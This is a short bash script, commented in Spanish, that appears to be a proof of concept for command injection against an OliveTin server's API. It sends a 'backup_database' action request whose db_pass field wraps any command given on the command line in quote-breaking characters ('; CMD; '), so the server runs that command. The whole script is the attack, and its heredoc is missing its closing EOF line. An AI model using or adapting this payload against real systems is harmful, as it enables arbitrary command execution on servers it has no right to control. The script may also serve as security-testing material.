#!/bin/bash
# probar_inyeccion.sh
CMD="$1"

curl -s -X POST http://127.0.0.1:1337/api/StartActionAndWait \
  -H "Content-Type: application/json" \
  -d @- <<EOF
{
  "actionId": "backup_database",
  "arguments": [
    {"name": "db_user", "value": "backup_svc"},
    {"name": "db_pass", "value": "'; ${CMD}; '"},
    {"name": "db_name", "value": "production"}
  ]
}
# Este es un tipo de inyección de un JSON predeterminado de OliveTin 
